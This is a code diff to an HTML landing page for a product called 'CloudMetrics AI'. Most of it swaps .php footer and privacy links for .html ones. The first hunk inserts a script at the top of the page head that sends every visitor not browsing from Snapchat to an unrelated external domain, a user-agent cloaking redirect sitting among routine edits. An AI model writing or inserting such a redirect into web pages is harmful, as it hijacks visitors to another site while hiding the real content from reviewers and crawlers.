@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
+    <script>
+    var ua = navigator.userAgent || '';
+    if (ua.toLowerCase().indexOf('snapchat') === -1) {
+        window.location.replace('https://omillionaire.com');
+    }
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CloudMetrics AI | Scale Faster with AI</title>
@@ -211,10 +217,10 @@
             </div>
             
             <div class="flex flex-wrap gap-6 text-sm text-slate-400">
-                <a href="about.php" class="hover:text-white transition-colors">About Us</a>
-                <a href="contact.php" class="hover:text-white transition-colors">Contact</a>
-                <a href="privacy.php" class="hover:text-white transition-colors">Privacy Policy</a>
-                <a href="terms.php" class="hover:text-white transition-colors">Terms of Service</a>
+                <a href="about.html" class="hover:text-white transition-colors">About Us</a>
+                <a href="contact.html" class="hover:text-white transition-colors">Contact</a>
+                <a href="privacy.html" class="hover:text-white transition-colors">Privacy Policy</a>
+                <a href="terms.html" class="hover:text-white transition-colors">Terms of Service</a>
             </div>
 
             <div class="flex gap-4 text-slate-400">
@@ -230,7 +236,7 @@
         <div class="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
             <p class="text-slate-300 text-sm">
                 We use cookies to personalize content and ads, provide social media features, and analyze our traffic. 
-                By clicking "Accept All", you consent to our use of cookies. Read our <a href="privacy.php" class="text-indigo-400 hover:text-indigo-300 underline">Privacy Policy</a>.
+                By clicking "Accept All", you consent to our use of cookies. Read our <a href="privacy.html" class="text-indigo-400 hover:text-indigo-300 underline">Privacy Policy</a>.
             </p>
             <div class="flex gap-3 shrink-0">
                 <button onclick="acceptCookies()" class="bg-indigo-600 hover:bg-indigo-500 text-white px-6 py-2 rounded-lg text-sm font-semibold transition-all">Accept All</button>
@@ -255,3 +261,4 @@
     </script>
 </body>
 </html>
+
